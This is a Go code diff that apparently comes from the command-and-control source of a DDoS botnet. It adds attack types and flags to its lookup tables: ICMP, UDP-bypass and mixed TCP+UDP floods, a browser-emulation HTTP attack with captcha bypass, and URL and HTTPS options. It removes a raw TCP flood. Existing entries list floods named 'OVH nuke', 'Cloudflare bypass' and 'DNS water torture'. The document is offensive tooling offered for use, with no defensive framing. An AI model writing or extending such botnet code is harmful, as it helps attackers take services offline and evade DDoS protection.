@@ -58,6 +58,8 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 	"maxlen":   FlagInfo{27, "max len"},
 	"payload":  FlagInfo{28, "custom payload"},
 	"repeat":   FlagInfo{29, "number of times to repeat"},
+	"url":      FlagInfo{30, "Full HTTP/HTTPS URL (e.g., http://example.com/path)"},
+	"https":    FlagInfo{31, "Use HTTPS/SSL (0 or 1)"},
 	"size":     FlagInfo{0, "Size of packet data (alias for len)"},
 	"port":     FlagInfo{7, "Destination port (alias for dport)"},
 }
@@ -107,17 +109,20 @@ var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
 	"tcpbypass": AttackInfo{33, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP bypass flood"},
 	"nflag":     AttackInfo{34, []uint8{0, 6, 7}, "No-flag TCP flood"},
 	"ovhnuke":   AttackInfo{35, []uint8{0, 6, 7}, "OVH nuke flood"},
-	"raw":       AttackInfo{36, []uint8{0, 6, 7}, "Raw TCP flood"},
 
 	/* Special Attacks (40-49) */
-	"vse":    AttackInfo{40, []uint8{7}, "Valve Source Engine flood"},
-	"dns":    AttackInfo{41, []uint8{7, 8, 9}, "DNS water torture"},
-	"greip":  AttackInfo{42, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE IP flood"},
-	"greeth": AttackInfo{43, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE Ethernet flood"},
+	"vse":       AttackInfo{40, []uint8{7}, "Valve Source Engine flood"},
+	"dns":       AttackInfo{41, []uint8{7, 8, 9}, "DNS water torture"},
+	"greip":     AttackInfo{42, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE IP flood"},
+	"greeth":    AttackInfo{43, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE Ethernet flood"},
+	"homeslam":  AttackInfo{44, []uint8{4}, "ICMP ping flood"},
+	"udpbypass": AttackInfo{45, []uint8{0, 1, 6, 7, 25}, "UDP bypass flood"},
+	"mixed":     AttackInfo{46, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Mixed TCP+UDP bypass"},
 
 	/* HTTP/HTTPS (50-59) */
-	"http":  AttackInfo{50, []uint8{7, 8, 20, 21, 22, 24}, "HTTP flood"},
-	"https": AttackInfo{51, []uint8{7, 8, 20, 21, 22, 24}, "HTTPS flood"},
+	"http":      AttackInfo{50, []uint8{7, 8, 20, 21, 22, 24, 30}, "HTTP flood"},
+	"https":     AttackInfo{51, []uint8{7, 8, 20, 21, 22, 24, 30}, "HTTPS flood"},
+	"browserem": AttackInfo{52, []uint8{7, 8, 20, 22, 24, 30}, "Browser emulation with captcha bypass"},
 
 	/* Cloudflare/Other (60+) */
 	"cf": AttackInfo{60, []uint8{7, 8, 20, 21, 22, 24}, "Cloudflare bypass"},
